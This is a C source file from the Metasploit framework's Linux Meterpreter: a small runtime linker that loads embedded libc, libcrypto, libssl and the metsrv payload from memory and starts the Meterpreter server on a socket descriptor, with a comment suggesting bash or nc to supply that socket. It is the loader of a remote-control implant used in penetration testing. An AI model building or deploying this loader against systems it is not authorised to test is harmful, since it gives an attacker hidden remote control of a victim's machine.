/*
 * metasploit 
 */

#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dlfcn.h>

#include "linker.h"
#include "linker_debug.h"
#include "linker_format.h"

#include "libc.h"
#include "libm.h"
#include "libcrypto.h"
#include "libssl.h"
#include "metsrv_main.h"

struct libs {
	char *name;
	void *buf;
	size_t size;
	void *handle;
};

static struct libs libs[] = {
	{ "libc.so", libc, libc_length, NULL },
	{ "libm.so", libm, libm_length, NULL },
	{ "libcrypto.so.0.9.8", libcrypto, libcrypto_length, NULL },
	{ "libssl.so.0.9.8", libssl, libssl_length, NULL },
	{ "metsrv_main", metsrv_main, metsrv_main_length, NULL },
};

#define LIBC_IDX 0
#define METSRV_IDX  4

/*
 * Once the library has been mapped in, this is where code execution needs to
 * begin payload wise. I'm not sure why we have base, I kept it because
 * that's what the API has.
 */

unsigned metsrv_rtld(int fd, void *base)
{
	int i;
	int (*libc_init_common)();
	int (*server_setup)();

	INFO("[ preparing to link. base @ %08x, and fd = %d ]\n", base, fd);

	for(i = 0; i < sizeof(libs) / sizeof(struct libs); i++) {
		libs[i].handle = (void *) dlopenbuf(libs[i].name, libs[i].buf, libs[i].size);
		if(! libs[i].handle) {
			TRACE("[ failed to load %s/%08x/%08x, bailing ]\n", libs[i].name, libs[i].buf, libs[i].size);
			exit(1);
		}
	}

	libc_init_common = dlsym(libs[LIBC_IDX].handle, "__libc_init_common");
	TRACE("[ __libc_init_common is at %08x, calling ]\n", libc_init_common);
	libc_init_common();

	server_setup = dlsym(libs[METSRV_IDX].handle, "server_setup");
	TRACE("[ metsrv server_setup is at %08x, calling ]\n", server_setup);
	server_setup(fd);

	TRACE("[ metsrv_rtld(): server_setup() returned, exit()'ing ]\n");
	exit(1);
}

/* 
 * If we are compiled into an executable, we'll start here.  I can't be
 * bothered adding socketcall() wrappers for bind / accept / connect / crap, so
 * use bash / nc / whatever to put a socket on fd 5 for now.
 *
 */

void _start()
{
	// meh, use bash.
	metsrv_rtld(5, NULL);
}
